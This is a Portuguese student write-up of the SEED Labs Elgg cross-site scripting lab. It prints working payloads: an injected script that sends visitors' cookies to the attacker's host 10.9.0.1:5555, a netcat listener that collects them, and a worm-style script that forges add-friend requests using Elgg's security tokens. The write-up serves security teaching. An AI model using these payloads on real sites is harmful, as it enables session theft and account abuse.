### Task 1

O objetivo desta tarefa é incorporar código Javascript no perfil do Elgg de um utilizador de forma a que quando um utilizador visualize o perfil desse utilizador o código Javascript seja executado e uma janela seja exibida.

ㅤㅤㅤ```<script>alert('XSS');</script>```

ㅤㅤㅤ<script>: abre uma tag "script".

ㅤㅤㅤalert(): cria uma janela pop-up com uma mensagem à nossa escolha, sendo esta <br/>ㅤㅤㅤcolocada como parametro da mesma.

- **1º passo:** dar login numa conta existente, neste caso utilizamos a conta da Alice
- **2º passo:** editar o campo brief description quando editamos o perfil, adicionando o código Javascript mencionado anteriormente

  <img width="704" alt="Screenshot 2023-05-02 at 14 15 47" src="https://user-images.githubusercontent.com/98234753/235677232-6743bace-bd3b-4ee3-ae71-e783c43df0be.png">

- **3º passo:** dar login noutra conta para verificar se o ataque XSS foi bem sucedido, neste caso, utilizamos a conta do Samy

  <img width="704" alt="Screenshot 2023-05-02 at 14 16 21" src="https://user-images.githubusercontent.com/98234753/235677397-669c6c89-e796-470c-8775-e94f6bba1296.png">


  Assim, sempre que alguém visitar o perfil da Alice irá ser aberta uma janela como na print anterior.

### Task 2

O objetivo desta tarefa é semelhante ao anterior, no entanto os cookies do utilizador sejam exibidos na janela de alerta.

ㅤㅤㅤ```<script>alert(document.cookie);</script>```

ㅤㅤㅤO procedimento é semelhante ao da tarefa anterior, no entanto o conteúdo do "alert()" é <br/> ㅤㅤㅤsubstituído pelos cookies do utilizador (document.cookie).

  <img width="703" alt="Screenshot 2023-05-02 at 14 19 16" src="https://user-images.githubusercontent.com/98234753/235678209-9abbe652-e363-4c86-86d6-f46f11eb7526.png">

  Resultado do ataque:

  <img width="701" alt="Screenshot 2023-05-02 at 14 19 51" src="https://user-images.githubusercontent.com/98234753/235678350-9a1f443a-ae36-41ca-845b-38feff736db5.png">


  **NOTA:** o utilizador logado vê as suas cookies, ou seja, o atacante não vê as cookies dos utilizadores, apenas as suas.

### Task 3

O objetivo desta tarefa é enviar os cookies do utilizador para o a atacante.Isto é feito por meio de inserção de uma tag HTML (<img>) que realiza um request que é enviado para a máquina do atacante (10.9.0.1; porta:5555)


ㅤㅤㅤ``` <script>document.write(’<img src=http://10.9.0.1:5555?c=’+ escape(document.cookie) + ’ >’); ㅤㅤㅤ</script>ㅤㅤㅤ```

**document.write()**: escreve o conteúdo especificado no documento HTML

**img src=http://10.9.0.1:5555?c=**: especifica a tag de img a ser inserida onde o atributo src é definido como o endereço de IP do atacante e a porta.

**escape(document.cookie)**: é uma função que codifica a string fornecida(o valor da cookie armazenada pelo navegador)como um argumento numa forma segura para ser transmitida como um parametro URL.

![T3_a](https://user-images.githubusercontent.com/123839132/235759162-6dec205f-f8d9-4990-b10b-f7554bf101ec.png)

Ao utilizar o seguinte comando ``` nc -lknv 5555 ``` conseguimos ter acessoa às cookies que são recebidas utilizando o prgrama netcat.
Na imagem abaixo, conseguimos verificar que o samy ao visitar o perfil da alice faz com que a alice tenha acesso às cookies do samy.

![T3_b](https://user-images.githubusercontent.com/123839132/235759353-b1f9a08f-1a1c-4737-b88b-970f052d4e7e.png)

### Task 4

Nesta tarefa pretendemos realizar um ataque semelhante ao que o Samy fez ao MySpace em 2005. O objetivo é a exploração da vulnerabilidade worn XSS com o objetivo de adicionar o “Samy” como amigo aos usuários que visitarem o seu perfil.

Temos a ferramenta de inspeção HTTP do Firefox que pode-nos ajudar a obter informações, ajudando a exibir o conteúdo de qualquer **HTTP Request** enviada pelo navegador.

Primeiramente temos que verificar como os pedidos de amizade são feitos, então inspecionamos o perfil do Samy de forma a recolher o **HTTP Request** associado ao adicionar o utilizador Samy:

``` http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1641298313&__elgg_token=EngTeTi2UKXmCwYNdnKckQ&__elgg_ts=1641298313&__elgg_token=EngTeTi2UKXmCwYNdnKckQ ```
**Nota:** Conseguimos verificar que o ID do Samy é o 59.

Foi nos fornecido um código JavaScript com o objetivo de enviar a mesma solicitação HTTP que obtivemos anteriormente sempre que alguém visitasse o perfil do Samy.

* Depois de analisar o código fornecido, primeiramente mudamos a variável “**sendurl**” e atribuímos à mesma o URL para adicionar o Samy como amigo: ```http://www.seed-server.com/action/friends/add?friend=59```;

* Os parâmetros **ts** e **token** são necessários para autenticar e validar a nossa solicitação de adicionar o Samy como amigo. Adicionamos assim ao nosso URL usando o operador ```+``` para concatenar as strings;

* Essas variáveis foram definidas anteriormente no código e contêm os parâmetros ```__elgg_ts``` e ```__elgg_token```;

* Assim ao utilizar o ```ts + token``` estamos a inserir os valores dessas variáveis na URL, para que o nosso HTTP Request inclua os parâmetros corretos e seja autenticada corretamente pelo servidor;

```js
<script type="text/javascript">
window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token; //FILL IN
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```


 ![T4_a](https://user-images.githubusercontent.com/123839132/236896453-186b7f60-c4ce-409d-92da-d8625c4e1280.png)

Entramos na conta do Samy e o script foi colocado em "About Me" em modo texto:
 ![T4_b](https://user-images.githubusercontent.com/123839132/236896463-cc892031-8a18-4325-a544-291258400696.png)

 ![T4_c](https://user-images.githubusercontent.com/123839132/236896476-bf4a2524-1dc4-4cae-b821-c18312370c14.png)

 ![T4_d](https://user-images.githubusercontent.com/123839132/236896534-10e40c12-ffa8-4df5-8f46-2eaf44456069.png)

 Assim dando login na conta da Alice, observamos que a Alice é automaticamente adicionada como amigo da Samy, mesmo não tedo enviado um pedido de amizade.

 ![T4_e](https://user-images.githubusercontent.com/123839132/236896544-8bed1689-6db8-4fd2-ab3a-729695f91b63.png)

**Questão 1: Explique o propósito das Linhas ➀ e ➁, por que elas são necessárias?**

A linha ➀ inclui o timestamp (__elgg_ts), enquanto a linha ➁ inclui o token elgg (__elgg_token). Esses parâmetros são necessários para autenticar e validar o pedido HTTP, garantindo com que o servidor considere que a origem deste é a vitima.

**Questão 2: Se o aplicativo Elgg fornecer apenas o modo Editor para o campo "Sobre mim", ou seja, você não pode alternar para o modo Texto, ainda pode iniciar um ataque bem-sucedido?**

Se a aplicação Elgg fornecer apenas o modo de edição para o campo “Sobre Mim” e não permitir alterar o modo de texto, é difícil lançarmos um ataque bem-sucedido. Isto ocorre porque o modo editor geralmente filtra ou desabilita a capacidade de inserir código diretamente, podendo assim dificultar a execução de um ataque bem-sucedido.
